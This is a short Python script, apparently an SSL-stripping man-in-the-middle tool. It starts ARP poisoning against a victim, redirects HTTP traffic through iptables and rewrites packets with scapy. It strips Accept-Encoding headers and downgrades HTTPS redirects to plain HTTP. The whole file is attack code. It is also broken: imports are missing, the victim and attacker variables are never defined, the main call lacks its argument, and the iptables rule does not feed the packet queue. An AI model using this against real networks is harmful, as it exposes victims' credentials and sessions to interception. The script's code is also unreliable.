from scapy.all import *
import re
import os
from netfilterqueue import NetfilterQueue

def process_packet(packet):
    scapy_packet = IP(packet.get_payload())

    if scapy_packet.haslayer(Raw):
        load = scapy_packet[Raw].load.decode(errors="ignore")
        if scapy_packet.haslayer(TCP):
            if scapy_packet[TCP].dport == 80:
                print("[+] Request")
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

            elif scapy_packet[TCP].sport == 80:
                print("[+] Response")
                load = re.sub("Location: https://", "Location: http://", load)

        if load != scapy_packet[Raw].load:
            scapy_packet[Raw].load = load
            del scapy_packet[IP].len
            del scapy_packet[IP].chksum
            del scapy_packet[TCP].chksum
            packet.set_payload(bytes(scapy_packet))

    packet.accept()

def ssl_strip(interface):

    # Start ARP poisoning in a separate thread
    arp_thread = threading.Thread(target=arp_poison.arp_poison, args=(ipVictim, macVictim, ipServer, macAttacker, interface))
    arp_thread.start()


    os.system("iptables -t nat -A PREROUTING -i {} -p tcp --destination-port 80 -j REDIRECT --to-port 10000".format(interface))
    queue = NetfilterQueue()
    try:
        queue.bind(0, process_packet)
        queue.run()
    except Exception as e:
        print("Error: {}".format(e))
        queue.unbind()
    finally:
        os.system("iptables --flush")

if __name__ == "__main__":
    ssl_strip()
